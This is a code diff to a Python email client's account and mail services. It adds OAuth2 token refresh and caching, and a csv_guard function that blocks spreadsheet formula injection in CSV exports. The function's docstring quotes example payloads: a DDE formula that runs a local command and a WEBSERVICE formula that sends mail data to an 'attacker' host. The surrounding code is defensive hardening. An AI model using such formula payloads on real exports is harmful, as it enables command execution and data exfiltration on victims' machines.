@@ -24,6 +24,12 @@ from ..config import (
     SYNC_SERVER_FLAGS,
 )
 from ..platforms import ImapError, get_adapter, make_account_stub
+from ..platforms.oauth import (
+    OAuthError,
+    TokenSet,
+    provider_for,
+    refresh_access_token,
+)
 from ..storage import (
     AccountRepository,
     AttachmentRepository,
@@ -106,6 +112,36 @@ def decode_text_bytes(data: bytes) -> str:
     return data.decode("utf-8", errors="replace")
 
 
+# Excel / LibreOffice / Numbers 会把以这些字符开头的单元格当公式求值
+_CSV_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r", "\n")
+
+
+def csv_guard(value: object) -> str:
+    """把来自邮件的文本转成「不会被表格软件当公式求值」的单元格。
+
+    `csv.writer` 的引号只解决**分隔符冲突**（逗号、引号、换行），
+    完全不解决**公式注入**：Excel 与 LibreOffice 会把以 `=` `+` `-` `@`
+    或制表符/回车开头的单元格当公式。于是任意发件人可控的字段
+    （显示名、地址、主题、摘要）都能变成载荷：
+
+    * `=cmd|' /C calc'!A0` —— 旧版 Excel 的 DDE，可执行本机命令；
+    * `=WEBSERVICE("https://attacker/"&A1)` —— 把邮件清单外带出去；
+    * `=HYPERLINK(...)` —— 钓鱼跳转。
+
+    对以危险字符开头的值加一个前导单引号：这是 Excel 的「强制文本」约定，
+    显示时引号不可见、内容按字面量呈现，LibreOffice 与 Numbers 行为一致。
+
+    对 `lstrip()` 之后的首字符也做判断——各家表格软件对前导空白的裁剪
+    规则不一致，宁可多一个引号，也不赌某个版本会 trim。
+    """
+    text = "" if value is None else str(value)
+    if not text:
+        return text
+    if text.lstrip(" \u00a0")[:1] in _CSV_FORMULA_TRIGGERS:
+        return "'" + text
+    return text
+
+
 def unlink_attachment_file(path: str | Path | None) -> bool:
     """尽力删除附件落盘文件。
 
@@ -163,6 +199,10 @@ class AccountService:
         self.bus = bus
         self.pending_flags = pending_flags
         self._active_id: str | None = None
+        # OAuth2 access_token 的内存缓存：{account_id: TokenSet}。
+        # 刻意不落盘：access_token 通常 1 小时过期，重开进程再换一次即可；
+        # 落盘只会多出一份需要加密、需要清理的凭证。
+        self._tokens: dict[str, TokenSet] = {}
 
     # ------------------------------------------------------------ 查询
     def list(self) -> list[Account]:
@@ -186,14 +226,27 @@ class AccountService:
         if not draft.email or "@" not in draft.email:
             return False, "请输入有效的邮箱地址"
         if not draft.password:
+            if str(getattr(draft, "auth_type", "")).startswith("oauth2"):
+                return False, "请先完成 OAuth2 授权"
             return False, "请输入密码或授权码"
         if draft.platform not in PLATFORMS:
             return False, "不支持的平台"
 
         adapter = get_adapter(draft.platform)
         stub = make_account_stub(draft)
+        secret = draft.password
+        if str(getattr(draft, "auth_type", "")).startswith("oauth2"):
+            # draft.password 此时是 refresh_token：先换一个短期 access_token。
+            # 不换的话 connect() 会拿 refresh_token 去 LOGIN，试连必然失败——
+            # 用户会以为「授权成功但添加不了」。
+            try:
+                tokens = refresh_access_token(
+                    provider_for(draft.platform), secret)
+                secret = tokens.access_token
+            except OAuthError as exc:
+                return False, f"OAuth2 授权校验失败：{exc}"
         try:
-            adapter.verify(stub, draft.password)
+            adapter.verify(stub, secret)
             return True, "连接成功，凭据有效"
         except ImapError as exc:
             return False, str(exc)
@@ -245,11 +298,41 @@ class AccountService:
         self.bus.accounts_changed.emit()
 
     def reload_password(self, account: Account) -> str:
-        """取出明文密码供同步使用（仅内存）。"""
+        """取出这一步要用的凭据（仅内存）。
+
+        * 密码账号：返回明文密码 / 授权码；
+        * OAuth2 账号：库里存的是 **refresh_token**，这里按需换一个短期
+          `access_token` 并缓存到过期为止。适配器按 `account.auth_type`
+          决定走 `LOGIN` 还是 `AUTHENTICATE XOAUTH2`。
+
+        刷新失败一律翻成 `SecurityError`：那意味着用户必须重新授权，
+        重试没有意义（继续重试只会在服务端刷出更多失败）。
+        """
         ct = self.accounts.get_credential(account.id)
         if ct is None:
             raise SecurityError("该账号缺少凭据，请重新添加")
-        return self.security.decrypt_secret(ct)
+        secret = self.security.decrypt_secret(ct)
+        if not str(getattr(account, "auth_type", "")).startswith("oauth2"):
+            return secret
+        return self._access_token(account, secret)
+
+    def _access_token(self, account: Account, refresh_token: str) -> str:
+        cached = self._tokens.get(account.id)
+        if (cached is not None and cached.refresh_token == refresh_token
+                and not cached.expired()):
+            return cached.access_token
+        try:
+            tokens = refresh_access_token(provider_for(account.platform), refresh_token)
+        except OAuthError as exc:
+            raise SecurityError(
+                f"{account.email} 的 OAuth2 授权已失效：{exc}\n"
+                "请在「设置 → 账号」里对该账号重新授权。"
+            ) from exc
+        # 刷新响应不一定带新的 refresh_token，沿用旧的，别把它覆盖成空串
+        if not tokens.refresh_token:
+            tokens.refresh_token = refresh_token
+        self._tokens[account.id] = tokens
+        return tokens.access_token
 
     def set_status(self, account_id: str, status: AccountStatus | str) -> None:
         value = status.value if isinstance(status, AccountStatus) else status
@@ -898,10 +981,12 @@ class MailService:
             for m in rows:
                 writer.writerow([
                     m.date.astimezone().strftime("%Y-%m-%d %H:%M") if m.date else "",
-                    m.from_name, m.from_addr, m.subject, m.platform, m.account_id,
+                    csv_guard(m.from_name), csv_guard(m.from_addr),
+                    csv_guard(m.subject), csv_guard(m.platform),
+                    csv_guard(m.account_id),
                     "是" if m.is_read else "否", "是" if m.is_starred else "否",
                     "是" if m.has_attachments else "否", m.raw_size,
-                    (m.preview or "").replace("\n", " "),
+                    csv_guard((m.preview or "").replace("\n", " ")),
                 ])
         log.info("已导出 CSV：%s（%d 行）", dest, len(rows))
         return dest, len(rows)
